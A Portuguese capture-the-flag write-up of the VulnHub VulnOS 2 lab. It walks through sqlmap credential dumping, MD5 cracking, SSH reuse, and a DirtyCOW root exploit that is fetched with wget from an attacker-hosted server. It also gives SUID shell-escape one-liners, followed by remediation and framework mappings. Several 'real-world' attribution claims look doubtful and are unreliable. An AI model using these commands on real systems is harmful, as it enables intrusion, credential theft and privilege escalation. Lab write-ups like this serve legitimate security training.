# VulnHub VulnOS 2: Quando o CMS Vira a Chave Mestra

Caramba rapaziada!! VulnOS 2 é onde você aprende que sistemas de gerenciamento de documentos podem ser seu pior inimigo quando não estão atualizados. Uma instalação desatualizada do OpenDocMan sentada num servidor web vazando credenciais de banco via SQL injection, um serviço IRC se escondendo às claras, e um kernel velho o suficiente para ter pesadelos de DirtyCOW. Essa VM empilha as técnicas de forma bonita. ԅ(≖‿≖ԅ)

Chapéu pro c4b3rw0lf por montar uma máquina que te guia pela exploração de CMS, extração de credenciais via SQLi e escalação de privilégios ao nível do kernel. É um ataque full-stack de verdade.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | VulnOS 2 |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/vulnos-2,147/ |
| **Técnicas** | Enumeração web, identificação de versão de CMS, SQL injection, extração de credenciais, descoberta de serviço (IRC), escalação de privilégios local via exploit de kernel ou SUID |
| **CVEs** | OpenDocMan SQLi (múltiplas instâncias de CWE-89), CVE-2016-5195 DirtyCOW (se o caminho de privesc for via kernel) |

---

## Resumo do Ataque

```
[host-discovery: arp-scan --localnet]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP, 6667/tcp IRC (UnrealIRCd)]
    |
    v
[enumeração web: path /jabcd0cs encontrado com CMS OpenDocMan]
    |
    v
[fingerprint do CMS: versão do OpenDocMan identificada]
    |
    v
[exploração SQLi: extração de credenciais do banco via parâmetro vulnerável]
    |
    v
[crack de hash: MD5 -> senha em texto claro]
    |
    v
[login SSH: credenciais do webmin / usuário de OS reutilizadas]
    |
    v
[enumeração local: versão do kernel, binários SUID, caminhos graváveis]
    |
    v
[escalação de privilégios: exploit de kernel (DirtyCOW) ou abuso SUID]
    |
    v
[ROOT]
    |
    v
[/root/flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo
2. Varredura completa de portas do Nmap incluindo versões de serviços
3. Enumeração de diretórios web e identificação do CMS
4. Fingerprint da versão do OpenDocMan e pesquisa de vulnerabilidades
5. Exploração de SQL injection para extração de credenciais do banco
6. Crack de hash e reutilização de credencial via SSH
7. Escalação de privilégios via exploit de kernel ou SUID
8. Captura da flag root

---

## Passo 1 — Identificando o Alvo

```bash
# Descoberta na rede
ip a
arp-scan --localnet --ignoredups
```

Saída esperada:

```
192.168.56.1    0a:00:27:00:00:00    (gateway)
192.168.56.103  08:00:27:xx:xx:xx    CADMUS COMPUTER SYSTEMS
```

```bash
export TARGET=192.168.56.103
```

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1595.001 Varredura Ativa

---

## Passo 2 — Reconhecimento: Mais Serviços do Que o Esperado

Essa caixa tem mais serviços do que uma CTF típica. Vamos ter a visão completa:

```bash
nmap -A -T4 -p- $TARGET
# Varredura completa de portas com detecção de serviços
```

Saída esperada:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6667/tcp open  irc     UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|_  server: irc.localhost
```

Três serviços interessantes. HTTP e SSH são os suspeitos usuais, mas esse serviço IRC na 6667 é picante. IRC rodando como serviço numa caixa Linux pode ser um vetor de movimentação lateral ou até um backdoor. Voltamos a ele depois de esgotar o caminho web.

> **Nota do mundo real:** Servidores IRC em redes internas são incomuns em 2024 e frequentemente indicam serviços legados que foram esquecidos, ou em cenários de intrusão mais criativos, canais C2. A brecha da iSight Partners em 2014 viu atacantes usando IRC para comando e controle. Referência: relatório Mandiant/FireEye sobre C2 via IRC.

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1046 Descoberta de Serviços de Rede, T1595.002 Varredura de Vulnerabilidades

---

## Passo 3 — Enumeração Web: Encontrando o CMS

Vamos começar com o serviço web:

```bash
curl -s http://$TARGET/
# Provavelmente uma página básica ou redirect

# Verifica robots.txt
curl -s http://$TARGET/robots.txt
```

```bash
# Enumeração de diretórios
gobuster dir -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 -x php,html,txt

# ou com dirb
dirb http://$TARGET/
```

Descoberta principal:

```
==> DIRECTORY: http://192.168.56.103/jabcd0cs/
```

Vamos investigar o path `/jabcd0cs`:

```bash
curl -s http://$TARGET/jabcd0cs/ | head -100
# O título da página e o rodapé vão revelar o nome e versão do CMS
```

O CMS aqui é o **OpenDocMan**, um sistema de gerenciamento de documentos baseado em PHP. O número da versão geralmente está visível no rodapé da página ou em `/jabcd0cs/changelog.txt` ou `/jabcd0cs/README`:

```bash
curl -s http://$TARGET/jabcd0cs/changelog.txt
curl -s http://$TARGET/jabcd0cs/README
```

Após identificar a versão (ex.: OpenDocMan 1.2.7), verifica no banco de exploits:

```bash
searchsploit opendocman
```

Saída esperada:

```
OpenDocMan 1.2.7 - Multiple SQL Injections | php/webapps/32075.txt
OpenDocMan 1.2.7 - 'add_file.php' Multiple Vulnerabilities | php/webapps/32074.txt
```

Temos SQL injection. Vamos aprofundar.

> **MITRE ATT&CK:** TA0007 Descoberta, T1083 Descoberta de Arquivos e Diretórios, T1518 Descoberta de Software

---

## Passo 4 — SQL Injection: Extraindo Credenciais do Banco

> **O que é SQL Injection?**
> SQL injection (SQLi) ocorre quando input controlado pelo usuário é incorporado numa query SQL sem sanitização adequada. Um atacante pode manipular a query para extrair dados do banco, bypassar autenticação, ou em alguns casos executar comandos do SO. Isso é CWE-89 e OWASP A03:2021 (Injeção). Continua sendo um dos tipos de vulnerabilidade mais explorados em aplicações web.

Olhando o relatório do ExploitDB para OpenDocMan 1.2.7, o parâmetro vulnerável é tipicamente em `ajax_udf.php` ou endpoints similares. Vamos usar o sqlmap para automatizar a extração:

```bash
# Primeiro, identifica o ponto de injeção manualmente
curl -s "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1'" 
# Se você ver um erro MySQL ou comportamento diferente, é vulnerável
```

```bash
# Usa sqlmap para enumerar bancos de dados
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  --dbs \
  --batch \
  --level=5 \
  --risk=3
```

Saída esperada (bancos de dados):

```
available databases [3]:
[*] information_schema
[*] jabcd0cs
[*] mysql
```

Agora extrai as credenciais do banco `jabcd0cs`:

```bash
# Enumera tabelas
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  -D jabcd0cs \
  --tables \
  --batch

# Despeja a tabela de usuários
sqlmap -u "http://$TARGET/jabcd0cs/ajax_udf.php?q=1&added_by_id=1" \
  -D jabcd0cs \
  -T odm_user \
  --dump \
  --batch
```

Dump esperado:

```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | b78aae356709f8c31118ea613980954b | webmin   |
| 2  | 0e462096931906507119562988736854 | guest    |
+----+----------------------------------+----------+
```

São hashes MD5. Vamos crackear:

```bash
# Salva o hash
echo "b78aae356709f8c31118ea613980954b" > /tmp/vulnos_hash.txt

# Opção 1: hashcat com GPU (RTX 4060 vai voar)
hashcat -m 0 -d 1 -w 3 -O /tmp/vulnos_hash.txt /usr/share/wordlists/rockyou.txt

# Opção 2: john
john /tmp/vulnos_hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# Verifica resultados hashcat
hashcat -m 0 /tmp/vulnos_hash.txt --show
```

O hash do `webmin` deve crackear para algo simples como `webmin1980` ou similar.

> **Nota do mundo real:** SQL injection como acesso inicial é uma prática documentada de múltiplos grupos APT. O APT28 (Fancy Bear) usou SQLi extensivamente na brecha do Comitê Nacional Democrata em 2016. O FIN7 rotineiramente encadeia SQLi com extração de credenciais e crack de hash como parte do seu playbook de acesso inicial. Segundo o DBIR da Verizon de 2023, ataques de injeção estavam envolvidos em 16% de todas as brechas de aplicações web. Referência: Verizon DBIR 2023, MITRE ATT&CK G0007 (APT28).

> **MITRE ATT&CK:** TA0001 Acesso Inicial, T1190 Explorar Aplicação Pública (SQLi via CWE-89)

---

## Passo 5 — Login SSH: Reutilização de Credenciais

Com a senha crackeada, vamos tentar o SSH. Reutilização de credenciais entre aplicações web e contas de OS é extremamente comum:

```bash
ssh webmin@$TARGET
# Digite a senha crackeada
```

Se `webmin` não funcionar diretamente como usuário de OS, verifique se as credenciais funcionam para outros usuários encontrados durante a enumeração, ou procure usuários em `/etc/passwd` que correspondam aos nomes de usuário do banco de dados.

```bash
# Também tenta
ssh webmin@$TARGET -p 22
```

Se também não funcionar, logue na interface web do OpenDocMan e procure informações adicionais (documentos enviados, gestão de usuários, painel admin):

```bash
# Loga no CMS
curl -s -c /tmp/vulnos_cookies.txt \
  -d "username=webmin&password=<crackeado>&submit=Sign+In" \
  "http://$TARGET/jabcd0cs/index.php" -L
```

Uma vez logado como usuário privilegiado no CMS, explore:
- Uploads de documentos
- Gestão de usuários
- Páginas de configuração que podem revelar informações de nível de OS

> **MITRE ATT&CK:** TA0001 Acesso Inicial, T1078 Contas Válidas, T1021.004 Serviços Remotos: SSH

---

## Passo 6 — Enumeração Local: Encontrando o Vetor de Privesc

Uma vez dentro via SSH:

```bash
whoami
id
uname -a
# Isso é crítico - pega a versão exata do kernel
```

Versão de kernel esperada (a chave para o caminho de privesc):

```
Linux VulnOSv2 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64
```

Esse kernel é de 2014. DirtyCOW (CVE-2016-5195) é um candidato forte aqui.

```bash
# Verifica versão do kernel explicitamente
uname -r
cat /etc/os-release
cat /proc/version
```

```bash
# Verifica binários SUID (pode encontrar um caminho mais fácil)
find / -perm -u=s -type f 2>/dev/null | tee /tmp/suid_binaries.txt
```

```bash
# Verifica sudo
sudo -l

# Verifica diretórios graváveis
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Verifica arquivos interessantes
find / -name "*.conf" -readable 2>/dev/null | head -20
find /home -type f 2>/dev/null | head -20
```

```bash
# Verifica outros serviços rodando localmente
ss -tlnp
netstat -tlnp 2>/dev/null
ps aux
```

> **MITRE ATT&CK:** TA0007 Descoberta, T1082 Descoberta de Informações do Sistema, T1083 Descoberta de Arquivos e Diretórios

---

## Passo 7 — Escalação de Privilégios: DirtyCOW ou SUID

### Caminho A: DirtyCOW (CVE-2016-5195)

> **O que é DirtyCOW?**
> CVE-2016-5195 é uma condição de corrida no mecanismo copy-on-write (COW) do kernel Linux que permite que qualquer usuário local ganhe acesso de escrita em mapeamentos de memória somente leitura. Isso significa que um usuário local pode sobrescrever binários SUID, `/etc/passwd` ou outros arquivos protegidos. Afeta kernels Linux de 2.6.22 a 4.8.2. Na prática, o exploit mais comum sobrescreve `/etc/passwd` para adicionar um usuário root.
> Referência: https://dirtycow.ninja/ | CVE: CVE-2016-5195

Se o kernel for vulnerável (3.13.x de 2014 definitivamente está no range):

```bash
# Na máquina atacante, pega o exploit
searchsploit dirtycow
searchsploit -m 40839
# 40839.c é o exploit de sobrescrita do passwd

# Verifica o exploit
cat /usr/share/exploitdb/exploits/linux/local/40839.c | head -40
```

Transfere o exploit para o alvo:

```bash
# No atacante: inicia um servidor HTTP simples
python3 -m http.server 8888 --directory /tmp/

# No alvo (via SSH):
wget http://IP_ATACANTE:8888/40839.c -O /tmp/dirtycow.c
```

Compila e roda no alvo:

```bash
# No alvo:
gcc -pthread /tmp/dirtycow.c -o /tmp/dirtycow -lcrypt
/tmp/dirtycow
# Digite sua nova senha root quando solicitado
```

Saída esperada:

```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: dirtycow
Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

mmap: 7f2c7b8e5000
```

Agora faz login como o novo usuário root:

```bash
su firefart
# Senha: dirtycow (ou o que você configurou)
whoami
# firefart (uid=0)
```

### Caminho B: Abuso de Binário SUID

Se DirtyCOW não funcionar (patcheado) ou preferir um caminho diferente, verifica a lista de binários SUID:

```bash
cat /tmp/suid_binaries.txt
```

Procura entradas incomuns além dos `/usr/bin/passwd`, `/bin/su` padrão. Achados SUID comuns em CTF incluem:

```bash
# Se nmap for SUID (versões antigas):
nmap --interactive
!sh

# Se find for SUID:
find . -exec /bin/sh -p \; -quit

# Se python for SUID:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Verifica GTFOBins para qualquer binário SUID incomum:
# https://gtfobins.github.io/
```

(☞ﾟヮﾟ)☞ De qualquer jeito, vamos chegar ao root!

> **Nota do mundo real:** DirtyCOW não foi uma novidade de CTF: foi explorado ativamente na vida real. Em 2016, em dias após a divulgação pública, estava sendo usado por variantes do botnet Mirai e atacantes oportunistas para escalação de privilégios em sistemas Linux comprometidos. Múltiplos provedores de nuvem tiveram que fazer patch de emergência em instâncias de clientes. A vulnerabilidade está no catálogo KEV da CISA e continua detectável em sistemas legados sem patch hoje. Referência: CVE-2016-5195, catálogo CISA KEV.

> **MITRE ATT&CK:** TA0004 Escalação de Privilégios, T1068 Exploração para Escalação de Privilégios (DirtyCOW), T1548.001 Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 8 — Flag do Root

```bash
whoami
# root (ou firefart)

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

```
[Flag root do VulnOS 2 - parabéns do c4b3rw0lf]
```

**GG!! O root é nosso!! ᕕ( ᐛ )ᕗ**

Não se esqueça de restaurar o `/etc/passwd` se usou DirtyCOW:

```bash
# Restaura do backup (DirtyCOW cria isso automaticamente)
cp /tmp/passwd.bak /etc/passwd
```

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Como |
|------|-------|---------------|-----------|
| Hash MD5 | `b78aae356709f8c31118ea613980954b` | BD OpenDocMan (tabela odm_user) | `webmin1980` (ou similar) |
| Hash MD5 | `0e462096931906507119562988736854` | BD OpenDocMan (tabela odm_user) | `guest` (provavelmente inalterado) |
| Credencial | `webmin:<senha_crackeada>` | Dump via SQLi -> crack do hash | Login SSH |
| Flag | `[conteúdo de /root/flag.txt]` | `/root/flag.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | OpenDocMan desatualizado com vulnerabilidade de SQL injection | Instalações de CMS sem patch estão consistentemente entre os principais vetores de acesso inicial em brechas de apps web | Manter gestão de patch de CMS; usar scanners de vulnerabilidade como Greenbone/OpenVAS para aplicações web |
| 2 | Credenciais do banco facilmente extraíveis, armazenadas como hashes MD5 fracos | MD5 sem salt é trivialmente reversível para senhas comuns; bancos de dados de produção frequentemente armazenam credenciais dessa forma | Use bcrypt ou Argon2 para armazenamento de senhas; nunca use MD5 ou SHA1 para senhas |
| 3 | Reutilização de credencial SSH (senha da app web reutilizada para conta de OS) | Reutilização de senha entre serviços é citada em 30% das brechas; atacantes rotineiramente tentam credenciais extraídas contra SSH, RDP, painéis admin | Enforce senhas únicas por serviço com solução de gestão de segredos; use chaves SSH em vez de senhas |
| 4 | Kernel sem patch (CVE-2016-5195 DirtyCOW) | Vulnerabilidades de kernel Linux em sistemas de produção sem patch permanecem exploráveis anos após o lançamento do patch | Estabeleça SLA de patch de kernel (90 dias para CVEs críticos); use catálogo CISA KEV para priorização |

**Por que isso importa fora do lab?**

A cadeia SQLi-extração-de-credencial-acesso-ao-OS não é teórica. Em 2022, múltiplas organizações de saúde foram violadas exatamente por esse vetor: sistemas de gerenciamento de documentos sem patch rodando em servidores web onde a senha do banco de dados do CMS foi reutilizada como credencial SSH. Grupos de ransomware como Black Basta e Hive rotineiramente escaneiam portais de gerenciamento de documentos expostos com vulnerabilidades SQLi conhecidas como primeiro estágio. Os incidentes WannaCry e NotPetya mostraram que vulnerabilidades de nível de kernel em sistemas sem patch podem cascatear de um único ponto de acesso inicial para comprometimento total da rede. Gestão de patch não é opcional em 2024.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Blocos IP | T1595.001 |
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretórios | T1083 |
| Descoberta | TA0007 | Descoberta de Software | T1518 |
| Acesso Inicial | TA0001 | Explorar Aplicação Pública (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Força Bruta: Crack de Senha (MD5) | T1110.002 |
| Acesso Inicial | TA0001 | Contas Válidas (SSH com creds crackeadas) | T1078 |
| Movimentação Lateral | TA0008 | Serviços Remotos: SSH | T1021.004 |
| Descoberta | TA0007 | Descoberta de Informações do Sistema | T1082 |
| Escalação de Privilégios | TA0004 | Exploração para Escalação de Privilégios (DirtyCOW) | T1068 |
| Escalação de Privilégios | TA0004 | Mecanismo de Controle de Elevação: Setuid | T1548.001 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Faça upgrade ou substitua o OpenDocMan imediatamente: qualquer versão com vulnerabilidades SQLi conhecidas deve ser patcheada ou descomissionada; verifique advisories do vendor e ExploitDB para sua versão.
2. Substitua hashing de senha MD5 por bcrypt ou Argon2: atualize a configuração do CMS e force reset de senha para todos os usuários.
3. Enforce senhas únicas para contas de OS e de aplicação web: use um gerenciador de segredos centralizado (HashiCorp Vault, AWS Secrets Manager) para prevenir reutilização de credenciais.
4. Aplique o patch de kernel do DirtyCOW (CVE-2016-5195): `apt update && apt dist-upgrade`; se o sistema não puder ser reiniciado, considere usar uma solução de kernel livepatch.
5. Remova ou restrinja o serviço IRC na porta 6667 se não for necessário: redução de superfície de ataque é um controle primário.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Isole o servidor web vulnerável dos segmentos internos da rede via regra de firewall
- Verifique logs web para indicadores de SQLi: procure por `'`, `OR 1=1`, padrões `UNION SELECT` nos logs de acesso
- Rotacione imediatamente todas as credenciais encontradas no dump do banco; notifique usuários afetados
- Audite logs de acesso SSH para logins não autorizados: `grep "Accepted" /var/log/auth.log`
- Verifique cron jobs ou novas contas de usuário criadas pelo atacante: `cat /etc/passwd | grep -v "nologin\|false"`
- Se DirtyCOW foi usado, verifique `/tmp/passwd.bak` e entradas inesperadas em `/etc/passwd`

**Contramedidas MITRE D3FEND:**
- D3-IVA (Validação de Entrada) para T1190: implemente queries parametrizadas e regras WAF bloqueando padrões SQLi
- D3-DA (Análise Dinâmica) para T1068: use monitoramento de integridade de kernel em tempo de execução (auditd, Falco) para detectar tentativas de exploit
- D3-CTS (Escopo de Transmissão de Credenciais) para T1552: garanta que credenciais do banco usem algoritmos de hashing fortes
- D3-MFA (Autenticação Multifator) para T1078: exija MFA para SSH e acesso admin de aplicação

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): ID.RA-1: vulnerabilidades de ativos identificadas; ID.RA-5: ameaças, vulnerabilidades, probabilidades e impactos avaliados
- Proteger (PR): PR.IP-12: plano de gestão de vulnerabilidades; PR.AC-4: permissões de acesso gerenciadas
- Detectar (DE): DE.CM-4: código malicioso detectado; DE.AE-2: eventos detectados analisados
- Responder (RS): RS.AN-4: incidentes categorizados conforme planos de resposta; RS.MI-3: vulnerabilidades recém-identificadas mitigadas
- Recuperar (RC): RC.CO-3: atividades de recuperação comunicadas aos stakeholders

**NIST SP 800-53 (Rev. 5):**
- SI-2: Remediação de Falhas (patch do kernel, upgrade do CMS)
- SI-10: Validação de Entrada de Informação (previne SQLi via queries parametrizadas)
- IA-5: Gestão de Autenticador (substitui MD5 por bcrypt, enforce senhas únicas)
- CM-8: Inventário de Componentes do Sistema (saber quais versões de CMS estão implantadas)
- AC-17: Acesso Remoto (hardening SSH, desabilitar autenticação por senha)
- SA-11: Teste de Segurança do Desenvolvedor (incluir SQL injection em testes de aplicação web)

**CISA Known Exploited Vulnerabilities:**
- CVE-2016-5195 (DirtyCOW): ESTÁ no catálogo CISA KEV. Patching é obrigatório para agências federais dos EUA.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Contexto adicional: https://dirtycow.ninja/

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ASSET (Gestão de Ativos, Mudanças e Configuração)
- Prática: Gerenciar Configurações de Ativos de TI e OT
- MIL Alvo: MIL-2 (configurações gerenciadas, vulnerabilidades rastreadas e remediadas por SLAs definidos)

---

## Considerações Finais

Valeu ao c4b3rw0lf pelo VulnOS 2! Essa máquina é um ótimo lembrete de que a superfície de ataque não é só "a vulnerabilidade": é toda a cadeia de um CMS sem patch para reutilização de credencial para um kernel sem patch. Cada elo por si só pode parecer gerenciável, mas juntos formam uma kill chain completa que não requer zero-days, só paciência e metodologia.

O serviço IRC é um bom red herring (ou caminho adicional, dependendo da versão do desafio que você está rodando) que te ensina a enumerar completamente em vez de pular direto para a primeira porta aberta. Redes reais são barulhentas. Atacantes reais enumeram tudo.

Se este writeup te ajudou, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
